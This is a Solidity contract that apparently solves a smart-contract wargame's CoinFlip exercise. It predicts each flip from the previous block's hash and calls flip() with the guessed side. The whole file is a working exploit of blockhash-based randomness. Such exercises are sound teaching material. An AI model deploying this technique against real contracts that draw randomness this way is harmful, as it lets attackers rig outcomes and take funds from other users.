// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";

contract FlipSolver {

  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip flipInstance;

  constructor(address _flipInstance) {
    flipInstance = CoinFlip(_flipInstance);
  }

  function doFlip() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    flipInstance.flip(side);
  }
}